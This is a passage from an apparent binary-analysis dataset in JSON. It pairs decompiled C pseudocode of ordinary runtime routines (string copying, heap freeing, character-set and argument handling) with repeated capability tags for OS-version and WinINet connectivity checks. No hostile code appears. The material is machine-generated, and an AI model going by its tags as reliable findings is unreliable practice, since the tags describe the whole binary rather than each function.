        "decompiled_code": "\nvoid __thiscall fcn.10008d80(int32_t param_1, uint32_t param_2)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar (*pauVar4) [16];\n    uint8_t *puVar5;\n    \n    if ((*(param_1 + 8) & 0x100) != 0) {\n        ppcVar1 = *(*(param_1 + 0xc) + 4);\n        pcVar2 = *ppcVar1;\n        if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n            param_2 = fcn.1000a294(param_2, ppcVar1 + 2);\n            param_2 = param_2 & 0xffff;\n        }\n        else {\n            param_2 = (**(pcVar2 + 0x20))(param_2);\n            param_2 = param_2 & 0xffff;\n        }\n    }\n    iVar3 = *(param_1 + 4);\n    if (*(iVar3 + 0x18) == 0) {\n        pauVar4 = fcn.1000ac95(0x20);\n        *pauVar4 = ZEXT816(0);\n        pauVar4[1] = ZEXT816(0);\n        *(iVar3 + 0x18) = pauVar4;\n    }\n    puVar5 = *(iVar3 + 0x18) + ((param_2 & 0xffff) >> 3);\n    *puVar5 = *puVar5 | 1 << (param_2 & 7);\n    return;\n}\n",
        "token_count": 364
    },
    "10008e10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10008e10(int32_t param_1, uint param_2)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    ushort uVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    \n    if ((*(param_1 + 8) & 0x100) == 0) {\n        uVar6 = param_2;\n    }\n    else {\n        ppcVar1 = *(*(param_1 + 0xc) + 4);\n        pcVar2 = *ppcVar1;\n        if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n            uVar6 = fcn.1000a294(param_2, ppcVar1 + 2);\n        }\n        else {\n            uVar6 = (**(pcVar2 + 0x20))(param_2);\n        }\n    }\n    iVar3 = *(param_1 + 4);\n    if (*(iVar3 + 0x1c) == 0) {\n        puVar7 = fcn.1000ac95(0xc);\n        *puVar7 = 0;\n        puVar7[1] = 0;\n        puVar7[2] = 0;\n        *(iVar3 + 0x1c) = puVar7;\n    }\n    puVar4 = *(iVar3 + 0x1c);\n    uVar5 = puVar4[1];\n    if (*puVar4 < uVar5 || *puVar4 == uVar5) {\n        uVar8 = fcn.1000fe67(puVar4[2], (uVar5 + 0x10) * 2);\n        if (uVar8 == 0) {\n            fcn.1000b73a();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        puVar4[2] = uVar8;\n        *puVar4 = uVar5 + 0x10;\n    }\n    *(puVar4[2] + puVar4[1] * 2) = uVar6;\n    puVar4[1] = puVar4[1] + 1;\n    return;\n}\n",
        "token_count": 516
    },
    "10008ec0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint16_t __thiscall fcn.10008ec0(uint param_1, int32_t param_2, uint32_t param_3, char param_4)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack4;\n    \n    iVar5 = 0;\n    if (*0x1003d344 != 0) {\n        iVar3 = 0;\n        param_2 = param_3 - param_2;\n        puVar4 = 0x1003d344;\n        uStack4 = param_1;\n        do {\n            if (param_2 >> 1 == *(iVar3 + 0x1003d348) * 2 >> 1) {\n                param_3 = param_3 & 0xffffff00;\n                cVar1 = fcn.10009830(*puVar4, &uStack4, param_3);\n                if (cVar1 != '\\0') break;\n            }\n            iVar5 = iVar5 + 1;\n            iVar3 = iVar5 * 0x10;\n            puVar4 = iVar3 + 0x1003d344;\n        } while (*(iVar3 + 0x1003d344) != 0);\n    }\n    uVar2 = 0;\n    if (*(iVar5 * 0x10 + 0x1003d344) != 0) {\n        uVar2 = *(iVar5 * 0x10 + 0x1003d34c);\n    }\n    if ((param_4 != '\\0') && ((uVar2 & 3) != 0)) {\n        uVar2 = uVar2 | 3;\n    }\n    return uVar2;\n}\n",
        "token_count": 391
    },
    "100091b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.100091b0(int32_t param_1)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (((*(param_1 + 0x50) & 0x4000) == 0) || (*(param_1 + 0x48) != 0x5c)) {\n        if ((*(param_1 + 0x50) & 0x20000) != 0) {\n            cVar2 = fcn.10007dc0(0);\n            if (cVar2 != '\\0') {\n                return 2;\n            }\n        }\n        iVar3 = fcn.100087e0(10, 0x7fffffff);\n        if (iVar3 == 0x7fffffff) {\n            cVar2 = fcn.10007fb0();\n            return cVar2 != '\\0';\n        }\n        if (*(param_1 + 0x44) != 0) {\n            fcn.1000a231(2);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    else {\n        *(param_1 + 0x44) = 0x5c;\n        fcn.100067a0();\n    }\n    return 1;\n}\n",
        "token_count": 306
    },
    "10009330": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.10009330(int32_t param_1)\n\n{\n    char cVar1;\n    uchar (*pauVar2) [16];\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    do {\n        cVar1 = fcn.10004470();\n        if (cVar1 != param_1) {\n            if (*(param_1 + 0x18) == 0) {\n                pauVar2 = fcn.1000ac95(0x20);\n                *pauVar2 = ZEXT816(0);\n                pauVar2[1] = ZEXT816(0);\n                *(param_1 + 0x18) = pauVar2;\n            }\n            puVar3 = (uVar4 >> 3) + *(param_1 + 0x18);\n            *puVar3 = *puVar3 | 1 << (uVar4 & 7);\n        }\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x100);\n    return;\n}\n",
        "token_count": 242
    },
    "100093a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.100093a0(int32_t param_1, uint param_2, uint param_3, uint32_t param_4)\n\n{\n    uint16_t **ppuVar1;\n    uint16_t *puVar2;\n    uint16_t **ppuVar3;\n    uchar (*pauVar4) [16];\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint ****extraout_ECX;\n    uint ****extraout_ECX_00;\n    uint ****extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint ****ppppuVar7;\n    uint8_t *puVar8;\n    uint16_t *puVar9;\n    uint32_t uVar10;\n    uint32_t **ppuVar11;\n    uint32_t uVar12;\n    int32_t **in_FS_OFFSET;\n    uint *arg_ch;\n    uint uStack92;\n    uint32_t *puStack88;\n    uint32_t auStack84 [5];\n    uint32_t uStack64;\n    uint ****appppuStack60 [4];\n    uint16_t *puStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x1002ab78;\n    piStack28 = *in_FS_OFFSET;\n    uStack36 = *0x10040068 ^ &stack0xfffffff0;\n    *in_FS_OFFSET = &piStack28;\n    puStack88 = *(param_1 + 4);\n    fcn.10009680(appppuStack60, param_2, param_3);\n    uStack20 = 0;\n    uVar12 = 0;\n    do {\n        uStack92 = uVar12 & 0xffff;\n        arg_ch = &uStack92;\n        ppuVar3 = fcn.10009680(auStack84, arg_ch, &uStack92 + 2);\n        ppppuVar7 = appppuStack60;\n        if (7 < uStack40) {\n            ppppuVar7 = appppuStack60[0];\n        }\n        ppuVar1 = ppuVar3 + 4;\n        if (0x7 < ppuVar3[5]) {\n            ppuVar3 = *ppuVar3;\n        }\n        puVar2 = *ppuVar1;\n        puVar9 = puStack44;\n        if (puVar2 < puStack44) {\n            puVar9 = puVar2;\n        }\n        for (; puVar9 != NULL; puVar9 = puVar9 + -1) {\n            if (*ppuVar3 != *ppppuVar7) {\n                uVar10 = (-(*ppuVar3 < *ppppuVar7) & 0xfffffffe) + 1;\n                goto code_r0x10009453;\n            }\n            ppuVar3 = ppuVar3 + 2;\n            ppppuVar7 = ppppuVar7 + 2;\n        }\n        uVar10 = 0;\ncode_r0x10009453:\n        if (uVar10 == 0) {\n            puVar2 = *ppuVar1;\n            if (puVar2 < puStack44) {\n                uVar10 = 0xffffffff;\n            }\n            else {\n                uVar10 = puStack44 < puVar2;\n            }\n        }\n        if (7 < uStack64) {\n            if ((0x7fffffff < uStack64 + 1) ||\n               ((uVar6 = auStack84[0],  0xfff < (uStack64 + 1) * 2 &&\n                (((((auStack84[0] & 0x1f) != 0 || (uVar6 = *(auStack84[0] - 4),  auStack84[0] <= uVar6)) ||\n                  (auStack84[0] - uVar6 < 4)) || (0x23 < auStack84[0] - uVar6)))))) goto code_r0x100095a2;\n            fcn.1000acc8(uVar6);\n        }\n        puVar5 = puStack88;\n        if (uVar10 == 0) {\n            if (puStack88[6] == 0) {\n                pauVar4 = fcn.1000ac95(0x20);\n                *pauVar4 = ZEXT816(0);\n                pauVar4[1] = ZEXT816(0);\n                puVar5[6] = pauVar4;\n            }\n            puVar8 = (uVar12 >> 3) + puVar5[6];\n            *puVar8 = *puVar8 | 1 << (uVar12 & 7);\n        }\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x100);\n    puStack88 = puVar5[10];\n    ppuVar11 = puVar5 + 10;\n    if (puStack88 != NULL) {\n        do {\n            puVar5 = *ppuVar11;\n            if (*puVar5 <= param_4) break;\n            ppuVar11 = puVar5 + 4;\n        } while (puVar5[4] != 0);\n        puStack88 = *ppuVar11;\n        if ((puStack88 != NULL) && (param_4 == *puStack88)) goto code_r0x1000957f;\n    }\n    puVar5 = fcn.1000ac95(0x14);\n    *puVar5 = param_4;\n    puVar5[1] = 0;\n    puVar5[2] = 0;\n    puVar5[3] = 0;\n    *ppuVar11 = puVar5;\n    puVar5[4] = puStack88;\ncode_r0x1000957f:\n    fcn.100097d0(param_2, param_3);\n    if (7 < uStack40) {\n        uStack40 = uStack40 + 1;\n        if (0x7fffffff < uStack40) {\ncode_r0x100095a2:\n            uStack40 = fcn.10010ddf();\n            appppuStack60[0] = extraout_ECX;\n        }\n        if (0xfff < uStack40 * 2) {\n            ppppuVar7 = appppuStack60[0];\n            if ((appppuStack60[0] & 0x1f) != 0) {\n                fcn.10010ddf();\n                ppppuVar7 = extraout_ECX_00;\n            }\n            appppuStack60[0] = ppppuVar7[-1];\n            if (ppppuVar7 <= appppuStack60[0]) {\n                appppuStack60[0] = fcn.10010ddf();\n                ppppuVar7 = extraout_ECX_01;\n            }\n            uVar12 = ppppuVar7 - appppuStack60[0];\n            if (uVar12 < 4) {\n                appppuStack60[0] = fcn.10010ddf();\n                uVar12 = extraout_ECX_02;\n            }\n            if (0x23 < uVar12) {\n                appppuStack60[0] = fcn.10010ddf();\n            }\n        }\n        fcn.1000acc8(appppuStack60[0]);\n    }\n    *in_FS_OFFSET = piStack28;\n    fcn.1000ac84(arg_ch);\n    return;\n}\n",
        "token_count": 1709
    },
    "10009610": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.10009610(uint param_1, uint param_2, uint32_t param_3, uint32_t **param_4)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    \n    puVar2 = *param_4;\n    if (puVar2 != NULL) {\n        do {\n            puVar2 = *param_4;\n            if (*puVar2 <= param_3) break;\n            param_4 = puVar2 + 4;\n        } while (puVar2[4] != 0);\n        puVar2 = *param_4;\n        if ((puVar2 != NULL) && (param_3 == *puVar2)) goto code_r0x10009664;\n    }\n    puVar1 = fcn.1000ac95(0x14);\n    *puVar1 = param_3;\n    puVar1[1] = 0;\n    puVar1[2] = 0;\n    puVar1[3] = 0;\n    *param_4 = puVar1;\n    puVar1[4] = puVar2;\ncode_r0x10009664:\n    fcn.100097d0(param_1, param_2);\n    return;\n}\n",
        "token_count": 276
    },
    "1000c440": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1000c440(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    \n    *(unaff_EBX + -4) = *(unaff_EBP + -0x2c);\n    fcn.1000d36c(*(unaff_EBP + -0x30));\n    iVar1 = fcn.1000f736();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x34);\n    iVar1 = fcn.1000f736();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x38);\n    if (((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) &&\n         ((unaff_EDI[5] == 0x19930520 || ((unaff_EDI[5] == 0x19930521 || (unaff_EDI[5] == 0x19930522)))))) &&\n        (*(unaff_EBP + -0x3c) == 0)) &&\n       ((*(unaff_EBP + -0x1c) != 0 && (iVar1 = fcn.1000d3b6(unaff_EDI[6]),  iVar1 != 0)))) {\n        fcn.1000c23e(unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "1000cd4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.1000cd4c(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.1000b9d0(0x1003e9b8, 0x10);\n    if (*(*(unaff_EBP + 0x10) + 4) < 0x81) {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    else {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar4;\n    iVar3 = fcn.1000f736();\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        if (iVar4 == *(unaff_EBP + 0x14)) goto code_r0x1000cde0;\n        if ((iVar4 < 0) || (iVar3 = *(unaff_EBP + 0x10),  *(iVar3 + 4) <= iVar4)) break;\n        iVar1 = *(iVar3 + 8);\n        uVar2 = *(iVar1 + iVar4 * 8);\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + iVar4 * 8) != 0) {\n            iVar1 = *(unaff_EBP + 8);\n            *(iVar1 + 8) = uVar2;\n            fcn.1000f830(*(*(iVar3 + 8) + 4 + iVar4 * 8), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        iVar4 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = iVar4;\n    }\n    do {\n        fcn.10012e08();\ncode_r0x1000cde0:\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.1000ce00();\n    } while (iVar4 != *(unaff_EBP + 0x14));\n    *(*(unaff_EBP + 8) + 8) = iVar4;\n    fcn.1000ba16();\n    return;\n}\n",
        "token_count": 628
    },
    "1000ce00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1000ce00(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.1000f736();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.1000f736();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "1001063e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t __cdecl fcn.1001063e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t unaff_EBP;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.1000b9d0(0x1003eaf8, 0x10);\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.10010ea9();\n        iVar2 = 0x16;\n        *puVar1 = 0x16;\n        fcn.10010dcf();\n    }\n    else {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.10010649(unaff_EBP + -0x20, puVar1, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14), *(unaff_EBP + 0x1c));\n        *(unaff_EBP + -0x1c) = iVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.1000ffd6();\n        if (iVar2 != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return iVar2;\n}\n",
        "token_count": 550
    },
    "1000ffd6": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1000ffd6(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_20h;\n    \n    if (*(unaff_EBP + -0x20) != 0) {\n        if (unaff_EDI != 0) {\n            puVar1 = *((*unaff_ESI >> 6) * 4 + 0x10041808) + 0x28 + (*unaff_ESI & 0x3f) * 0x38;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.10015018(*unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "10011806": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10011806(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x10041a10, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.10010ea9();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.10010e30(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "10012734": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.10012734(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    char *var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar1 = 0;\n    }\n    else if ((arg_8h == 2) || (arg_8h == 1)) {\n        fcn.1001b59b();\n        iVar1 = 0;\n        fcn.1001afdc(0, 0x100415f0, 0x104);\n        *0x10041b18 = 0x100415f0;\n        var_10h = *0x10041b28;\n        if ((*0x10041b28 == NULL) || (**0x10041b28 == '\\0')) {\n            var_10h = 0x100415f0;\n        }\n        var_4h = 0;\n        var_ch = 0;\n        fcn.1001256e(var_10h, 0, 0, &var_4h, &var_ch);\n        piVar3 = fcn.100126e5(var_4h, var_ch, 1);\n        piVar4 = piVar3;\n        if (piVar3 == NULL) {\n            puVar2 = fcn.10010ea9();\n            iVar1 = 0xc;\n            *puVar2 = 0xc;\n        }\n        else {\n            fcn.1001256e(var_10h, piVar3, piVar3 + var_4h, &var_4h, &var_ch);\n            if (arg_8h == 1) {\n                *0x10041b1c = var_4h + -1;\n                piVar4 = NULL;\n                *0x10041b20 = piVar3;\n            }\n            else {\n                var_8h = NULL;\n                iVar1 = fcn.1001af0a(piVar3, &var_8h);\n                piVar3 = var_8h;\n                if (iVar1 == 0) {\n                    *0x10041b1c = 0;\n                    iVar1 = *var_8h;\n                    while (iVar1 != 0) {\n                        var_8h = var_8h + 1;\n                        *0x10041b1c = *0x10041b1c + 1;\n                        iVar1 = *var_8h;\n                    }\n                    var_8h = NULL;\n                    iVar1 = 0;\n                    *0x10041b20 = piVar3;\n                }\n                fcn.10011806(var_8h);\n                var_8h = NULL;\n            }\n        }\n        fcn.10011806(piVar4);\n    }\n    else {\n        puVar2 = fcn.10010ea9();\n        iVar1 = 0x16;\n        *puVar2 = 0x16;\n        fcn.10010dcf();\n    }\n    return iVar1;\n}\n",
        "token_count": 708
    },
    "10012927": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.10012927(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x100416f8 != 0) {\n        return 0;\n    }\n    fcn.1001b59b();\n    arg_8h = fcn.1001b8ba();\n    if (arg_8h == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar1 = fcn.10012792(arg_8h);\n        if (iVar1 == 0) {\n            uVar2 = 0xffffffff;\n        }\n        else {\n            uVar2 = 0;\n            *0x100416f8 = iVar1;\n            *0x10041704 = iVar1;\n        }\n        fcn.10011806(0);\n    }\n    fcn.10011806(arg_8h);\n    return uVar2;\n}\n",
        "token_count": 209
    },
    "10018564": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.10018564(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_19h;\n    \n    if (*(unaff_EBP + -0x19) != '\\0') {\n        fcn.10011439(3);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "1001d0bb": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.1001d0bb(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack24;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x1001cff8:\n            if (arg_ch != 0) {\n                piVar3 = arg_8h;\n                iVar5 = arg_ch;\n                if ((arg_14h == 0) || (arg_10h != NULL)) {\n                    do {\n                        if (*piVar3 == 0) break;\n                        piVar3 = piVar3 + 1;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                    if (iVar5 != 0) {\n                        if (arg_14h == -1) {\n                            iVar4 = arg_10h - piVar3;\n                            do {\n                                iVar1 = *(iVar4 + piVar3);\n                                *piVar3 = iVar1;\n                                piVar3 = piVar3 + 1;\n                                if (iVar1 == 0) break;\n                                iVar5 = iVar5 + -1;\n                            } while (iVar5 != 0);\n                        }\n                        else {\n                            iVar4 = arg_14h;\n                            if (arg_14h != 0) {\n                                do {\n                                    iVar1 = *arg_10h;\n                                    arg_10h = arg_10h + 1;\n                                    *piVar3 = iVar1;\n                                    piVar3 = piVar3 + 1;\n                                    if ((iVar1 == 0) || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                                    iVar4 = iVar4 + -1;\n                                } while (iVar4 != 0);\n                            }\n                            if (iVar4 == 0) {\n                                *piVar3 = 0;\n                            }\n                        }\n                        if (iVar5 != 0) {\n                            return 0;\n                        }\n                        if (arg_14h == -1) {\n                            arg_8h[arg_ch + -1] = 0;\n                            return 0x50;\n                        }\n                        *arg_8h = 0;\n                        puVar2 = fcn.10010ea9();\n                        uStack24 = 0x22;\n                        goto code_r0x1001d016;\n                    }\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x1001cff8;\n    puVar2 = fcn.10010ea9();\n    uStack24 = 0x16;\ncode_r0x1001d016:\n    *puVar2 = uStack24;\n    fcn.10010dcf();\n    return uStack24;\n}\n",
        "token_count": 691
    },
    "100216e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
